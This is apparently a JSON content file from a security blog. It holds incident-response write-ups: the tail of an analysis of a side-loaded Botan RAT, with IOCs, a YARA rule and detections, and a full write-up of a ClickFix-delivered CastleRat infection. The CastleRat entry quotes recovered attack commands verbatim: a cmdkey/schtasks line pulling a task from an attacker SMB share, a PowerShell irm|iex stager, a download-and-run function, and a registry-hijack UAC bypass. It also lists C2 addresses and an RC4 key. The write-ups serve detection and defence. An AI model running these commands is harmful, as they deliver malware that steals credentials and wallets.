849a2c808694426b2afb8848dcea00f9e64538a503b05543e38af1fdee9dd9f8\n%LOCALAPPDATA%\\Ditto\\Ditto.exe                   Host binary\n                                                 b120f170046b0ba5952d4957dd25e0a394ad28f743b47f2152c973e9fd94f08d\n%LOCALAPPDATA%\\Ditto\\vcruntime140.dll            FAKE implant (primary Stage 2 side-load)\n                                                 9d20d9f17dddedd3ea057b68e42ef2ca86ff7c776d59b045213f377ba1707291\n%LOCALAPPDATA%\\Ditto\\mfc140u.dll                 27ebf5ed915a573aa10a4ec18b3626a297032f3c46afc2daf45d8bb1ffecfe66\n%LOCALAPPDATA%\\Ditto\\msvcp140.dll                968bbd2a36b04cc5795c6fc99afe85e4d294ff9c28032ce0e870463827181799\n%LOCALAPPDATA%\\Ditto\\vcruntime140u.dll           eb6a3a491efcc911f9dff457d42fed85c4c170139414470ea951b0dafe352829\n%LOCALAPPDATA%\\Ditto\\ICU_Loader.dll              15a9c2550759eee371d57fa69e4d7d596235f2f061cd17ca123cba535a24fbcd\n%LOCALAPPDATA%\\Ditto\\Addins\\DittoUtil.dll        1ba47b26175855cba499ff8e951af5193e662319e96d497f4270daac440da1fd\n</code></pre>\n<h3>Persistence</h3>\n<pre><code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Ditto.lnk\n</code></pre>\n<h3>Implant identifier</h3>\n<pre><code>573d2149-b7b1-4d54-b0d4-403195f3984e\n</code></pre>\n<h3>Build artifacts</h3>\n<pre><code>Botan 3.0.0 (unreleased, revision unknown)\nAES-256/GCM\nGCC: (GNU) 13-win32\nlibgcc_s_dw2-1.dll\nBOTAN_MLOCK_POOL_SIZE\n</code></pre>\n<h2>YARA Rule</h2>\n<pre><code>rule Ditto_BotanRAT_Implant\n{\n    meta:\n        description = &quot;Detects Ditto-side-loaded Botan RAT implant&quot;\n        author      = &quot;ghostsh-labs&quot;\n\n    strings:\n        $botan   = &quot;Botan 3.0.0 (unreleased&quot; ascii\n        $aes     = &quot;AES-256/GCM&quot;             ascii\n        $mlock   = &quot;BOTAN_MLOCK_POOL_SIZE&quot;   ascii\n        $beacon  = &quot;\\&quot;arch\\&quot;: \\&quot;windows\\&quot;&quot;   ascii\n        $ip_b64  = &quot;NDUuNTUuOTQuMTc0&quot;        ascii\n        $guid    = &quot;573d2149-b7b1-4d54-b0d4-403195f3984e&quot; ascii\n        $mingw   = &quot;GCC: (GNU) 13-win32&quot;     ascii\n        $authtag = &quot;Invalid authentication tag&quot; ascii\n\n    condition:\n        uint16(0) == 0x5A4D and\n        filesize &lt; 8MB and\n        (\n            ($botan and $aes and ($mlock or $authtag)) and\n            ($ip_b64 or $guid or $beacon) and\n            $mingw\n        )\n}\n</code></pre>\n<h2>Detection Opportunities</h2>\n<h3>Endpoint</h3>\n<ul>\n<li><code>pdf24.exe</code> loading <code>user.dll</code> from a non-system / drop directory (Stage 1)</li>\n<li><code>Ditto.exe</code> executing from <code>%LOCALAPPDATA%\\Ditto\\</code> without a corresponding software inventory / install record</li>\n<li><code>Ditto.exe</code> loading <code>vcruntime140.dll</code> from <code>%LOCALAPPDATA%\\Ditto\\</code> instead of <code>System32</code> / <code>SysWOW64</code> (Stage 2 implant)</li>\n<li>Hash match on fake <code>vcruntime140.dll</code> (<code>9d20d9f1…07291</code>) or Botan/string YARA hits on <code>user.dll</code> / that DLL</li>\n<li><code>msiexec.exe</code> writing a new binary tree under <code>%LOCALAPPDATA%\\Ditto\\</code></li>\n<li>Startup folder <code>.lnk</code> files pointing at <code>%LOCALAPPDATA%\\Ditto\\Ditto.exe</code></li>\n</ul>\n<h3>Identity</h3>\n<ul>\n<li><code>\\PIPE\\efsrpc</code> access to domain controllers from non-DC workstations</li>\n<li><code>DRSGetNCChanges</code> from non-domain-controller hosts</li>\n<li>Kerberos TGS bursts without correlated interactive logon</li>\n<li><code>&lt;svc_account&gt;</code> authenticating from unexpected hosts</li>\n</ul>\n<h3>Network</h3>\n<ul>\n<li>UDP/53 to non-resolver destinations (especially cloud VPS ranges)</li>\n<li>UDP/53 payloads that fail DNS protocol validation</li>\n<li>Domain controllers initiating outbound NTLM to cloud provider ranges</li>\n<li>Workstation traffic to DigitalOcean without legitimate SaaS correlation</li>\n</ul>\n<h3>Behavioral</h3>\n<ul>\n<li>Quick Assist sessions from non-corporate Microsoft accounts</li>\n<li>Multiple MSI downloads from the same external IP in a short window</li>\n<li>Remote support agents (GetScreen, DWAgent) installed on servers without change tickets</li>\n</ul>\n<h2>Recommendations</h2>\n<h3>Immediate</h3>\n<ol>\n<li>Restrict Quick Assist via GPO to IT workstations that require it.</li>\n<li>Block remote support installers (GetScreen, DWAgent, AnyDesk, ScreenConnect, TeamViewer) on non-IT endpoints via AppLocker or WDAC.</li>\n<li>Deploy Defender for Identity (or equivalent) on all domain controllers.</li>\n<li>Audit service accounts for Domain Admin membership and remove unnecessary privileges.</li>\n<li>Apply PetitPotam mitigations: EFSRPC patches, SMB signing, EPA, channel binding.</li>\n</ol>\n<h3>Strategic</h3>\n<ol>\n<li>Tier administrative access; block workstation-to-DC admin authentication paths.</li>\n<li>Deploy LAPS for local administrator accounts.</li>\n<li>Disable NTLM where Kerberos is sufficient.</li>\n<li>Conditional Access policies blocking privileged accounts on standard workstations.</li>\n<li>Include vishing / fake helpdesk scenarios in security awareness training.</li>\n</ol>\n<h2>Root Cause</h2>\n<p>No zero-day was required. The intrusion stacked ordinary failures:</p>\n<ol>\n<li>User accepted an unsolicited Quick Assist session.</li>\n<li>A service account held Domain Administrator rights without restrictions.</li>\n<li>Domain controllers lacked identity threat detection coverage.</li>\n<li>Authentication coercion and NTLM relay mitigations were incomplete.</li>\n<li>Outbound UDP/53 to arbitrary destinations was unrestricted.</li>\n<li>Remote support software could be installed on servers without alerting.</li>\n</ol>\n<p>The DLL craft and DNS C2 mattered for the foothold. The over-privileged service account and missing identity controls decided the blast radius.</p>"
  },
  {
    "id": "castle-rat-delivery-chain",
    "title": "CastleRat Delivery Chain",
    "summary": "ClickFix social engineering via cmdkey and remote schtasks, leading to a CastleRat implant with Steam profile dead-drop C2.",
    "category": "DFIR",
    "date": "2026-04-23",
    "readTime": "6 min",
    "tags": [
      "clickfix",
      "castle-rat",
      "delivery-chain",
      "windows",
      "malware"
    ],
    "content": "<h1>CastleRat Delivery Chain</h1>\n<h2>Summary</h2>\n<pre><code>CLASS      : RAT delivery / ClickFix chain\nVECTOR     : Social engineering (Win+R paste as fake CAPTCHA)\nSTAGE 1    : cmdkey + remote schtasks XML over SMB\nSTAGE 2    : PowerShell irm|iex stager (AMSI dilution)\nSTAGE 3    : .NET loader → bundled Python runtime\nIMPLANT    : CastleRat / NightShadeC2\nC2 RESOLVE : Steam Community profile dead-drop\nC2         : 45.88.106.190:4545 (resolved)\n</code></pre>\n<p>ClickFix-style delivery ending in CastleRat / NightShadeC2. User pasted an attacker-supplied command into Run (<code>Win+R</code>) believing it was CAPTCHA verification. The interesting part is the delivery path - remote task XML, junk-padded PowerShell, and Steam dead-drop C2 resolution - not the final implant.</p>\n<h2>Initial Access - ClickFix</h2>\n<p>The lure page was not preserved, but the executed command was recovered from endpoint telemetry:</p>\n<pre><code class=\"language-cmd\">cmd.exe /c cmdkey /add:195.10.205.171 /user:guest &amp;&amp; schtasks /Create /TN &quot;Lowks&quot; /XML &quot;\\\\195.10.205.171\\kxc\\full.xml&quot; &amp; REM I am not a robot - Cloudflare ID: qbIohbNXJpIB7wj\n</code></pre>\n<p>The trailing <code>REM</code> comment is intentional camouflage. It mimics Cloudflare verification text so the command appears benign when pasted quickly.</p>\n<h2>Credential Staging and Scheduled Task</h2>\n<p>The command chains two actions with <code>&amp;&amp;</code>.</p>\n<h3>cmdkey</h3>\n<pre><code class=\"language-cmd\">cmdkey /add:195.10.205.171 /user:guest\n</code></pre>\n<p>Stores credentials for <code>\\\\195.10.205.171\\</code> as <code>guest</code> in Windows Credential Manager. This prevents an interactive credential prompt when the next step accesses the remote SMB share.</p>\n<h3>schtasks</h3>\n<pre><code class=\"language-cmd\">schtasks /Create /TN &quot;Lowks&quot; /XML &quot;\\\\195.10.205.171\\kxc\\full.xml&quot;\n</code></pre>\n<p>The task definition is hosted on a remote SMB share rather than embedded in the command. Benefits for the operator:</p>\n<ul>\n<li>Task content is not written locally in a standard path</li>\n<li>The XML can be updated server-side without changing the lure</li>\n<li>Behavioral detections may only see <code>schtasks</code> execution, not the malicious task body</li>\n</ul>\n<p><code>full.xml</code> contains a task that runs:</p>\n<pre><code class=\"language-powershell\">powershell -c &quot;irm hxxps://yhofgafjle[.]com | iex&quot;\n</code></pre>\n<p>This is a standard download-and-execute pattern: <code>Invoke-RestMethod</code> fetches a script and pipes it directly to <code>Invoke-Expression</code> with no intermediate file on disk.</p>\n<h2>PowerShell Stager - AMSI Dilution</h2>\n<p>The script from <code>yhofgafjle[.]com</code> contains hundreds of lines of filler:</p>\n<pre><code class=\"language-powershell\">$xYzAbc = &quot;lorem&quot;\n$pPpQqq = $xYzAbc + &quot;ipsum&quot;\nfunction asd0192hjkl { return $true }\n$rndVar = Get-Random -Minimum 1 -Maximum 9999\n</code></pre>\n<p>This padding dilutes AMSI and static signature matches. The functional payload is buried in the noise:</p>\n<pre><code class=\"language-powershell\">function cWtdXfLUVptO {\n    $ulaSVjsMmF = &quot;https://yhofgafjle.com/maestrovsd.exe&quot;\n    $pURHzjVsUNaWGZ = &quot;C:\\Windows\\Temp\\TrHtWFGyRY.exe&quot;\n    Invoke-WebRequest -Uri $ulaSVjsMmF -OutFile $pURHzjVsUNaWGZ\n    Start-Process -FilePath $pURHzjVsUNaWGZ\n}\n</code></pre>\n<p>The script downloads <code>maestrovsd.exe</code>, writes it to <code>C:\\Windows\\Temp\\TrHtWFGyRY.exe</code>, and executes it. Variable names appear randomized per deployment to frustrate string-based detection.</p>\n<h2>.NET Loader and Python Runtime</h2>\n<p><code>maestrovsd.exe</code> is a ~150KB .NET assembly compiled within a week of execution.</p>\n<pre><code>Verdict:        Malicious (100/100)\nFamily:         CastleRat / NightShadeC2\nTags:           rat, stealer, botnet, python, uac\nFirst C2:       212.43.154.198:23814 (Latvia / PODAON)\n</code></pre>\n<p>On execution, the loader spawns multiple PowerShell processes (<code>-NoProfile</code>) and retrieves staged payloads:</p>\n<pre><code>http://162.33.177.16/Dvizhok.zip\nhttp://162.33.177.16/NiceNic.zip\nhttp://162.33.177.16/either/Python.zip\nhttp://162.33.177.16/either/install.pyc\nhttp://162.33.177.16/either/veQcBTuTnPwMD.Ar\nhttps://adamcold.com/NiceNic/Python.zip\nhttps://adamcold.com/NiceNic/melody.pyc\nhttps://adamcold.com/NiceNic/5o7dkS4S.8\n</code></pre>\n<p>The ZIP archives contain full Python runtimes including signed <code>python.exe</code>, <code>pythonw.exe</code>, and <code>python313.dll</code>. The malware ships its own interpreter instead of relying on a host-installed version.</p>\n<p>Dropped locations:</p>\n<pre><code>C:\\ProgramData\\5171NWNrWQ\\   ← Python 3.9 environment\nC:\\ProgramData\\92WKzFYLqB\\   ← Python 3.13 environment\n</code></pre>\n<p>Execution uses signed <code>pythonw.exe</code> against <code>install.pyc</code> and <code>melody.pyc</code>, so the process tree shows a trusted binary running Python bytecode.</p>\n<h2>In-Memory C# Compilation and UAC Bypass</h2>\n<p>Sandbox analysis captured <code>csc.exe</code> invoked with <code>.cmdline</code> argument files, producing temporary DLLs in <code>%TEMP%</code>:</p>\n<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\n    /noconfig /fullpaths @&quot;C:\\Users\\&lt;user&gt;\\AppData\\Local\\Temp\\is3na01s.cmdline&quot;\n</code></pre>\n<p>This indicates inline C# compilation from PowerShell (<code>Add-Type</code>). Source is generated at runtime, compiled, and loaded without a persistent malicious DLL on disk.</p>\n<p>UAC bypass via <code>ComputerDefaults.exe</code> registry hijack:</p>\n<pre><code>Parent:    C:\\ProgramData\\92WKzFYLqB\\pythonw.exe\nChild:     C:\\Windows\\System32\\ComputerDefaults.exe\nIntegrity: HIGH (elevated)\n</code></pre>\n<p>The malware modifies <code>HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command</code> and triggers auto-elevated <code>ComputerDefaults.exe</code>. Detection: <code>ComputerDefaults.exe</code> should not have a non-<code>explorer.exe</code> parent.</p>\n<h2>C2 Resolution - Steam Dead Drop</h2>\n<p>The implant does not hardcode its C2 address. It retrieves:</p>\n<pre><code>https://steamcommunity.com/id/dpmorin49sdiw302fw\n</code></pre>\n<p>The bot fetches the Steam Community profile, parses the bio, and extracts the embedded C2 string. Infrastructure rotation only requires editing the profile.</p>\n<p><img alt=\"Steam profile dead-drop resolver\" src=\"assets/steam-dead-drop.png\" /></p>\n<p>Resolved C2 in this case: <code>45.88.106.190:4545</code> (Netherlands, ON-LINE-DATA).</p>\n<p>Config extraction also identified backup C2 <code>8.3.0.253</code> and RC4 key:</p>\n<pre><code>596d626a6f39745634686470324c7430  →  Ymbjo9tV4hdp2Lt0\n</code></pre>\n<p>The key decrypts secondary stages <code>5o7dkS4S.8</code> and <code>veQcBTuTnPwMD.Ar</code> (~5MB and ~15MB RC4-encrypted blobs loaded in memory).</p>\n<p>The Python payload is PyArmor-protected. Static <code>.pyc</code> analysis is limited; memory dumps are required for meaningful reverse engineering.</p>\n<p>YARA hits on process dumps tagged both <strong>CastleRat</strong> and <strong>NightShadeC2</strong>, likely the same codebase or a close fork based on infrastructure overlap.</p>\n<h2>Post-Compromise Capabilities</h2>\n<p>Observed stealer functionality:</p>\n<ul>\n<li><strong>Browsers</strong> - Chrome, Edge, Firefox (cookies, credentials, autofill). Firefox decryption via victim-installed <code>nss3.dll</code>.</li>\n<li><strong>Crypto wallets</strong> - Exodus, Electrum, Atomic, Coinomi, Jaxx, Ledger Live, Ethereum keystore, WalletWasabi; extension wallets including MetaMask, Phantom, TronLink.</li>\n<li><strong>Password managers</strong> - 1Password, NordPass directory enumeration.</li>\n<li><strong>VPN</strong> - NordVPN, ProtonVPN configs.</li>\n<li><strong>FTP</strong> - Cyberduck, FileZilla.</li>\n<li><strong>Screenshots</strong> - observed across <code>pythonw.exe</code> memory regions.</li>\n</ul>\n<p>Exfiltration over resolved C2 <code>45.88.106.190:4545</code>.</p>\n<h2>Attack Chain</h2>\n<pre><code>[User] ──── pastes &quot;Cloudflare CAPTCHA&quot; command ──→ [cmd.exe]\n                                                       │\n                                                       ▼\n                                          cmdkey + schtasks /XML\n                                                       │\n                                                       ▼\n                                       [SMB \\\\195.10.205.171\\kxc\\full.xml]\n                                                       │\n                                                       ▼\n                                            Scheduled Task &quot;Lowks&quot;\n                                                       │\n                                                       ▼\n                                         powershell -c &quot;irm ... | iex&quot;\n                                                       │\n                                                       ▼\n                                       [yhofgafjle.com - junk-padded script]\n                                                       │\n                                                       ▼\n                                       cWtdXfLUVptO()  →  maestrovsd.exe\n                                                       │\n                                                       ▼\n                          ┌────────────────────────────┴──────────────────────┐\n                          │                                                   │\n                       PowerShell                                       .NET loader\n                          │                                                   │\n                          ▼                                                   ▼\n                    csc.exe (in-mem C#)                          Python bundle download\n                          │                                                   │\n                          └────────────────────────┬──────────────────────────┘\n                                                   ▼\n                              C:\\ProgramData\\{random}\\pythonw.exe install.pyc\n                                                   │\n                                                   ▼\n                                       ComputerDefaults.exe UAC bypass\n                                                   │\n                                                   ▼\n                                  steamcommunity.com/id/... ← C2 resolver\n                                                   │\n                                                   ▼\n                                  CastleRat / NightShadeC2 → 45.88.106.190:4545\n</code></pre>\n<h2>Indicators of Compromise</h2>\n<h3>Hashes (SHA256)</h3>\n<pre><code>File            Hash\n--------------  ----------------------------------------------------------------\nmaestrovsd.exe  e25534efbab99f08ca802c6d3974c2ff7c47ddd6e6ed71a84a94c2fddd7de4e2\ninstall.pyc     b953bb0acb76848f889909256d67d01d44cc45d83c8bfc3421783ac0a79688fc\nmelody.pyc      91919832f20d8fb78bab82844a430ecbe02a07df3f317316a8c34f54e3bb45c2\n</code></pre>\n<h3>Network</h3>\n<pre><code>Indicator                  Role\n-------------------------  --------------------------------\n195.10.205.171             SMB staging (cmdkey target)\nyhofgafjle[.]com           PowerShell stager host\n162.33.177.16              Payload distribution (HTTP)\nadamcold[.]com             Payload distribution (HTTPS)\n212.43.154.198:23814       Initial C2 (Latvia)\n45.88.106.190:4545         Resolved C2 (Netherlands)\n8.3.0.253                  Backup C2\n</code></pre>\n<h3>Dead Drop</h3>\n<pre><code>steamcommunity[.]com/id/dpmorin49sdiw302fw\n</code></pre>\n<h3>Filesystem</h3>\n<pre><code>C:\\ProgramData\\5171NWNrWQ\\\nC:\\ProgramData\\92WKzFYLqB\\\nC:\\Windows\\Temp\\TrHtWFGyRY.exe\n%LOCALAPPDATA%\\NiceNickAlliceRachelCoach*\n%LOCALAPPDATA%\\StreamEtheriumLife*\n</code></pre>\n<h3>Crypto</h3>\n<pre><code>RC4 key:  Ymbjo9tV4hdp2Lt0\n</code></pre>\n<h3>Scheduled Task</h3>\n<pre><code>Name:  Lowks\nXML:   \\\\195.10.205.171\\kxc\\full.xml\n</code></pre>\n<h2>Detection Opportunities</h2>\n<ul>\n<li><code>cmdkey /add</code> followed by <code>schtasks /Create /XML</code> referencing a remote UNC path</li>\n<li>PowerShell <code>irm | iex</code> from a newly created scheduled task</li>\n<li><code>pythonw.exe</code> executing from <code>C:\\ProgramData\\{random}\\</code> with no corresponding software install record</li>\n<li><code>ComputerDefaults.exe</code> spawned by non-<code>explorer.exe</code> parent</li>\n<li>Outbound HTTPS to <code>steamcommunity.com</code> from Python or PowerShell child processes, followed by connections to newly resolved IPs</li>\n<li>RC4-encrypted archive downloads (<code>*.8</code>, <code>*.Ar</code>) from known distribution hosts</li>\n</ul>"
  }
];
